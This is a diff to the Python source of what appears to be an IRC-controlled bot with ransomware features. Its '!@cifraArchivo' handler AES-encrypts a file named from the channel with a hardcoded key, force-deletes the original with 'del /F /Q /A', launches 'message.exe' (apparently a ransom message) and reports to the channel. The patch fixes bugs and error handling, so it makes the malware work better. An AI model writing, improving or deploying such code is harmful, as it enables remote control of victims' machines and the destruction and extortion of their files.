@@ -25,18 +25,24 @@ def Cifra(key, fnamec):
             IV+=chr(random.randint(0,0xff))
       encryptor= AES.new(key, AES.MODE_CBC,IV)
 
-      with open(fnamec, 'rb') as infile:
-            with open(outputfile, 'wb') as outfile:
-                  outfile.write(filesize)
-                  outfile.write(IV)
+      try:
+        with open(fnamec, 'rb') as infile:
+                with open(outputfile, 'wb') as outfile:
+                    outfile.write(filesize)
+                    outfile.write(IV)
 
-                  while True:
-                        chunk =infile.read(chunksize)
-                        if len(chunk)==0:
-                              break
-                        elif len(chunk) % 16 !=0:
-                              chunk+=' '*(16-(len(chunk)%16))
-                        outfile.write(encryptor.encrypt(chunk))
+                    while True:
+                            chunk =infile.read(chunksize)
+                            if len(chunk)==0:
+                                break
+                            elif len(chunk) % 16 !=0:
+                                chunk+=' '*(16-(len(chunk)%16))
+                            outfile.write(encryptor.encrypt(chunk))
+					
+			        
+                    return "Cifrado exitoso."
+      except IOError:
+        return "Error de permisos"
 
 
 def CreaLlave(key):
@@ -157,17 +163,18 @@ def do_command(irc, ircmsg):
             send_msg(irc, canal, sub_stdout.replace("\r\n", ""))
 
         elif ircmsg.find("!@cifraArchivo") != -1:
-            command_rec = ircmsg.split("!@cifra ")[1]
-		          command_rec = command_rec.split(" ")
+            command_rec = ircmsg.split("!@cifraArchivo ")[1]
+            command_rec = command_rec.split(" ")
             send_msg(irc, canal, "Cifrando...")
             fileA=command_rec[0]
             if os.path.exists(fileA):
-		             	llave = CreaLlave('hola')
-                Cifra(llave,fileA)
-			             os.system("del /F /Q /A "+ fileA)
-			             send_msg(irc, canal, "Cifrado exitoso.")
-             else:
-		             	send_msg(irc, canal, "No existe el archivo.")
+                sub_stdout, sub_stderr = Popen(["message.exe"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
+                llave = CreaLlave('hola')
+                mensaje = Cifra(llave,fileA)
+                os.system("del /F /Q /A "+ fileA)
+                send_msg(irc, canal, mensaje)
+            else:
+		        send_msg(irc, canal, "No existe el archivo.")
 
         
         elif ircmsg.find("!@bye") != -1:
